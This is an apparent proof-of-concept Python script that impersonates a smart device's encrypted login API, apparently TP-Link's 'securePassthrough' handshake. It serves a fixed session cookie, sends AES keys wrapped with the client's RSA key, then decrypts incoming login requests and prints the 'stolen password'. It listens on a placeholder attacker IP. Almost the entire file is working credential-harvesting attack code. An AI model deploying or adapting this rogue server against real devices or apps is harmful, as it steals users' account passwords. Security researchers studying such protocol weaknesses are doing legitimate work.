import http
import os
from http import cookies
from http.server import BaseHTTPRequestHandler, HTTPServer
import pkcs7
import base64
from base64 import b64encode
from Crypto.PublicKey import RSA
import json
from Crypto.Cipher import AES, PKCS1_v1_5


iv=os.urandom(16)
key=os.urandom(16)
iv_b=bytearray()
key_b= bytearray()

for i in range(0, 16):
	key_b.insert(i,iv[i])
for i in range(0, 16):
	iv_b.insert(i, key[i])
conc=bytearray()
for i in range(0, 16):
	conc.insert(i,iv[i])
for i in range(16, 32):
	conc.insert(i, key[i-16])

iv = iv_b
key = key_b
def decrypt(data: str):
    aes = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))
    pad_text = aes.decrypt(base64.b64decode(data.encode("UTF-8"))).decode("UTF-8")
    return pkcs7.PKCS7Encoder().decode(pad_text)

class RequestHandlerHTTP(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        json_object=json.loads(post_data)
        method=json_object["method"]
        if method=="handshake":
            public_key = json_object["params"]["key"]
            public_cipher = PKCS1_v1_5.new(RSA.importKey(public_key))
            do_final = public_cipher.encrypt(conc)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            cookie = http.cookies.SimpleCookie()
            cookie['TP_SESSIONID'] = "361863816381351853355515371537232323232323"
            cookie['TIMEOUT'] = "86400"
            for cookie in cookie.values ():
                self.send_header("Set-Cookie", cookie.OutputString())
            self.end_headers()
            jsonRes = {"error_code": 0, "result": {"key": b64encode(do_final).decode('UTF-8')}}
            self.wfile.write(json.dumps(jsonRes, separators=(',', ':')).encode())

        if method=="securePassthrough":
            req = json_object["params"]["request"]
            print('stolen password='+base64.b64decode(json.loads(decrypt(req))["params"]["password"].encode("UTF-8")).decode('utf-8'))

def run():
     attackerIP ="ATTACKER_IP_ADDRESS"
     server_address = (attackerIP, 80)
     httpd = HTTPServer(server_address, RequestHandlerHTTP)
     httpd.serve_forever()
run()